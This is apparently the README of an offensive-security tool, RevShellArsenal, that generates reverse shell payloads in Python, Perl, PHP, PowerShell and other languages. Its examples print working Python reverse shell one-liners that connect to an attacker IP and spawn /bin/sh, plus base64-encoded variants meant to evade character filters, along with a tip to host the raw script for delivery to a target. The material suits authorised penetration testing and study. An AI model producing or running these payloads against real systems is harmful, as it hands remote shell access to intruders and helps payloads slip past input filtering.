# RevShellArsenal

___RevShellArsenal___ is a small tool I wrote to generate reverse shells in differents languages, based on widely known techniques (e.g.: pentestmonkey cheat sheet). 

<p align="center">
  <img src="https://raw.githubusercontent.com/itm4n/RevShellArsenal/master/screenshots/00_RevShellArsenal.gif">
</p>

## Usage
```
usage: rsg.py [-h] [--raw] [--encode]
              {all,shell,perl,python,php,groovy,cmd,powershell} lhost lport

RevShellArsenal - Reverse Shell Generator

positional arguments:
  {all,shell,perl,python,php,groovy,cmd,powershell}
                        Payload (choose 'all' to generate all payloads)
  lhost                 Local IP address
  lport                 Local port

optional arguments:
  -h, --help            show this help message and exit
  --raw                 Print raw payload instead of one-liner
  --encode              Encode raw payload and print command
```

## Examples

1. __One-liner__

Generate a __Pyhon__ Reverse Shell __one-liner__.
```
user@host:~$ ./rsg.py python 10.10.13.37 1234
[SHELL][PYTHON][ONE-LINER]
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.37",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

2. __Raw code__

Generate a __Python__ Reverse Shell and print it as __raw code__. This is useful if you want to output the result to a script a file and then __host it on a web server__ to deliver it to the target.
```
user@host:~$ ./rsg.py python 10.10.13.37 1234 --raw
[PYTHON][RAW]
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.13.37",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

3. __One-liner with encoded payload__

Generate a __Python__ Reverse Shell and print it as an __encoded command__. This is useful to __avoid special characters__.
```
user@host:~$ ./rsg.py python 10.10.13.37 1234 --encode
[SHELL][PYTHON][ENCODED]
bash -c "{echo,cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTMuMzciLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=}|{base64,-d}|{bash,-i}"

[PYTHON][ENCODED]
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTAuMTAuMTMuMzciLDEyMzQpKTsKb3MuZHVwMihzLmZpbGVubygpLDApOwpvcy5kdXAyKHMuZmlsZW5vKCksMSk7Cm9zLmR1cDIocy5maWxlbm8oKSwyKTsKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7'.decode('base64'))"
```

## Credits

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) - The famous reverse shell cheat sheet from pentestmonkey.

[Nishang PowerShell Reverse Shells](https://github.com/samratashok/nishang/tree/master/Shells) - Great PowerShell scripts for Windows-based reverse shells.

[java.lang.Runtime.exec() Payload Workarounds](https://jthuraisamy.github.io/archives.html/runtime-exec-payloads.html) - A tool to _encode_ Bash, PowerShell, Perl and Python commands/scripts. Useful when special characters usage is limited. The link is broken but is still available in [Google cache](https://webcache.googleusercontent.com/search?q=cache:5AdcRIUec4sJ:https://jackson.thuraisamy.me/runtime-exec-payloads.html).
